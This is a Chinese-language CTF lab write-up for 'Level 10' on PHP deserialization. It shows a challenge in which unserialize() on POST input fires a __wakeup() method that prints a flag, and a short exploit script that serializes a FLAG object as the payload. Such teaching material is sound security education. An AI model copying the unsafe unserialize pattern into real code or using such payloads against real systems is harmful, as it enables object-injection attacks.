# WriteUP · Level 10


正式的进入了反序列化的题目，这里我们从第一个常见的魔术方法 —— `__wakeup()` 开始。

> [unserialize()](https://www.php.net/manual/zh/function.unserialize.php) 会检查是否存在一个 [__wakeup()](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup) 方法。如果存在，则会先调用 `__wakeup` 方法，预先准备对象需要的资源。
>
> [__wakeup()](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup) 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。
>
> ——[【PHP 手册 - 魔术方法 # wakeup】](https://www.php.net/manual/zh/language.oop5.magic.php#object.wakeup)

当我们从序列化字符串还原对象，也就是进行反序列化操作的时候，wakeup方法会被触发：

```PHP
class FLAG{
    function __wakeup() {
        include 'flag.php';
        echo $flag;
    }
}

if(isset($_POST['o']))
{
    unserialize($_POST['o']);
}else {
    highlight_file(__FILE__);
}
?>
```

题目要求我们用 `o` 以POST的方式提交一个序列化字符串，而后进行反序列化工作，所以我们只需要在本地创建FLAG类然后序列化为字符串即可，EXP：

```PHP
<?php 
class FLAG{}

$obj = new FLAG();

echo urlencode(serialize($obj));
```

